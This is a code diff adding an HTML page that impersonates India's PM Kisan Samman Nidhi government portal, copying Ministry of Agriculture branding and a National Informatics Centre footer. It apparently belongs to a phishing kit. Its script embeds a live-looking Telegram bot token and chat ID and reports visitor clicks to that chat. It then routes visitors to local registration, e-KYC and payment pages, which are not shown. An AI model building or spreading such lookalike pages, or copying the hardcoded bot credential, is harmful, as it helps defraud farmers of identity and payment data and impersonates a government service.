@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PM KISAN Samman Nidhi</title>
+    <!-- Slick Slider CSS -->
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Header Image Section */
+        .header-image {
+            background-color: #1565c0;
+            text-align: center;
+            padding: 5px 0;
+        }
+
+        .header-image img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        /* Mid Banner */
+        .mid-banner img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .image-slider {
+            max-width: 100%;
+            margin: 20px auto;
+        }
+
+        /* Main Content Section */
+        .main-content {
+            padding: 15px;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: rgb(0, 0, 0);
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        /* Boxes Section */
+        .box-container {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+        }
+
+        .box {
+            background-color: #232392;
+            border: 3px solid #dbdb0c;
+            color: yellow;
+            padding: 20px;
+            width: 30%;
+            text-align: center;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        .box:hover {
+            background-color: #0044cc;
+        }
+
+        /* New Box for PM KISAN SCHEME */
+        .pmkisan-box {
+            background-color: #232392;
+            border: 3px solid #dbdb0c;
+            color: yellow;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: center;
+            border-radius: 10px;
+        }
+
+        .pmkisan-box h3 {
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .pmkisan-box p {
+            font-size: 1rem;
+        }
+
+        /* Responsive Design for Mobile */
+        @media (max-width: 768px) {
+            .box-container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .box {
+                width: 80%;
+                margin-bottom: 10px;
+            }
+        }
+
+        /* Style for Red Color and Bold Text */
+        .highlight-text {
+            color: red;
+            font-weight: bold;
+        }
+        .mid-banner img {
+            max-width: 50%;  /* Adjust the percentage as per your requirement */
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Telegram Button Style */
+        .telegram-button {
+            background-color: #0088cc;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        .telegram-button:hover {
+            background-color: #006699;
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Header Image Section -->
+    <div class="header-image">
+        <img src="header.jpg" alt="Department of Agriculture Banner">
+    </div>
+
+    <!-- Image Slider Section -->
+    <div class="image-slider slider">
+        <div><img src="WebBanner-1.jpg" alt="Image 1"></div>
+        <div><img src="WebBanner-2.jpg" alt="Image 2"></div>
+        <div><img src="pmkisan5.jpg" alt="Image 3"></div>
+    </div>
+
+    <div class="box-container">
+        <div class="box" id="registration" onclick="redirectToRegistration()">👮‍♂️ New Farmer Registration</div>
+        <div class="box" id="ekyc" onclick="redirectToEkyc()">✅ e-KYC</div>
+        <div class="box" id="payment" onclick="redirectToPayment()">💳 Payment Installation</div>
+    </div>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <p>
+            <span class="highlight-text">Hon'ble Prime Minister has released the 18th installment of PM Kisan Yojana on 05 October 2024.</span><br>
+
+            eKYC is MANDATORY for PMKISAN Registered Farmers. OTP Based eKYC is available on PMKISAN Portal<br>
+            
+            or nearest CSC centres may be contacted for Biometric based eKYC.
+        </p>
+    </main>
+
+    <!-- New PM KISAN SCHEME Box -->
+    <div class="pmkisan-box">
+        <h3>PM KISAN SCHEME</h3>
+        <p>PM Kisan is a Central Sector scheme with 100% funding from Government of India. It has become operational from 1.12.2018. Under the scheme, an income support of Rs. 6,000/- per year in three equal installments will be provided to all land holding farmer families. The definition of family for the scheme is husband, wife, and minor children. The scheme is aimed at providing financial assistance to small and marginal farmers across the country.</p>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+            <!-- Telegram Button -->
+            <button class="telegram-button" onclick="sendTelegramMessage()">Send Message via Telegram</button>
+        </div>
+    </footer>
+
+    <!-- jQuery and Slick Slider JS -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+    <script>
+        const TELEGRAM_API_TOKEN = "7714806324:AAFOeSPa7CX_wxM1BRnEb1ZCJxpOlVHnhuw";
+        const CHAT_ID = "--1002253043573";
+
+        function sendTelegramNotification(message) {
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            fetch(telegramUrl)
+                .then(response => console.log('Notification sent:', response))
+                .catch(error => console.error('Error sending notification:', error));
+        }
+
+        function redirectToRegistration() {
+            sendTelegramNotification('User clicked on New Farmer Registration');
+            window.location.href = 'NEW.HTML';
+        }
+
+        function redirectToEkyc() {
+            window.location.href = 'E-KYC.HTML';
+        }
+
+        function redirectToPayment() {
+            window.location.href = 'payment.html';
+        }
+
+        $(document).ready(function(){
+            $('.slider').slick({
+                autoplay: true,
+                autoplaySpeed: 3000,
+                dots: false,
+                arrows: false,
+                infinite: true,
+                speed: 500,
+                cssEase: 'linear'
+            });
+        });
+
+        // Telegram Bot Integration
+        async function sendTelegramMessage() {
+            const message = 'Hello from PM KISAN Website!';
+            const url = `https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    alert('Message sent successfully!');
+                } else {
+                    alert('Failed to send message: ' + data.description);
+                }
+            } catch (error) {
+                console.error('Error sending message:', error);
+                alert('An error occurred while sending the message.');
+            }
+        }
+    </script>
+
+</body>
+</html>
